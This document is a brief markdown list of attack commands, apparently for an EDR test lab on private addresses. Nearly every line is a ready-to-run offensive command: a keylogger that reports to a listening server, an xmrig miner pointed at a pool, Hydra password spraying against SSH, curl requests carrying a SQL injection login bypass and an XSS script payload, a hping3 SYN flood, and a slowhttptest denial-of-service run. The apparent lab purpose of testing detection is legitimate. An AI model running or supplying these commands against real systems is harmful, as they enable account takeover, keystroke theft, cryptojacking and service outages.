# Attack Commands

## Malware Attacks

### Keylogger

#### Ubuntu
```bash
cd keylogger
sudo ./keylogger 192.168.6.1 12345
```

#### Kali
```bash
cd ~/keylogger
./server
```

## Crypto Miner

#### Kali
```bash
cd Desktop
sudo python3 ./mock_pool.py
```

#### Ubuntu
```bash
cd ~/xmrig-6.26.0
sudo ./xmrig -o 192.168.6.1:3333 -u edr-test-user -p x --coin monero
```

---

## Brute Force Attacks
### Password Spraying

#### Kali
```bash
cd Desktop
hydra -L userlist.txt -P passlist.txt -u ssh://192.168.6.4 -t 4 -V
```

---
## Injection Attacks

### SQL Injection

#### Kali
```bash
curl -i -X POST http://192.168.6.4:3000/rest/user/login \
  -H "Content-Type: application/json" \
  --data '{"email":"'\'' OR 1=1--","password":"password"}'
```

---

### XSS

#### Kali
```bash
curl -i -G \
  "http://192.168.6.4:3000/rest/products/search" \
  --data-urlencode "q=<script>alert('XSS_TEST')</script>"
```

---

## Network Attacks

### SYN Flood

#### Kali
```bash
sudo hping3 -S --flood 192.168.6.4
```

---

### Slow HTTP Test

#### Kali
```bash
slowhttptest -c 20000 -H -i 1 -r 300 -u http://192.168.6.4 -l 240